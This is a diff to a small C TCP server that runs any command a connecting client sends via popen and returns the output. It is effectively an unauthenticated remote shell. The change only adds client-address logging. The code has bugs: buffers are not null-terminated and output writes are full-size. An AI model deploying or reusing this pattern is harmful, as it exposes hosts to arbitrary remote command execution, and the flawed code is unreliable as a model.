@@ -40,6 +40,8 @@ int main(int argc, char *argv[])
     int server_fd = 0;
     int client_fd = 0;
     struct sockaddr_in server_addr;
+    struct sockaddr_in client_addr;
+    socklen_t client_len = sizeof(client_addr);
     char client_cmd[1024];
     char server_buffer[1024];
     fd_set rdfs;
@@ -73,8 +75,12 @@ int main(int argc, char *argv[])
         exit(EXIT_FAILURE);
     }
 
+    fprintf(stdout, "starting server...\n");
+
     while (1) {
-        client_fd = accept(server_fd, NULL, NULL);
+        client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);
+
+        fprintf(stdout, "client %s connected\n", inet_ntoa(client_addr.sin_addr));
 
         while (1) {
             FD_ZERO(&rdfs);
@@ -88,15 +94,15 @@ int main(int argc, char *argv[])
 
             read(client_fd, client_cmd, sizeof(client_cmd));
             if (!strcmp(client_cmd, "exit")) {
+                fprintf(stdout, "client %s disconnected\n", inet_ntoa(client_addr.sin_addr));
                 close(client_fd);
                 break;
             }
 
             pipe = popen(client_cmd, "r");
             if (pipe) {
-                while (fgets(server_buffer, sizeof(server_buffer), pipe)) {
+                while (fgets(server_buffer, sizeof(server_buffer), pipe))
                     write(client_fd, server_buffer, sizeof(server_buffer));
-                }
 
                 pclose(pipe);
                 pipe = NULL;
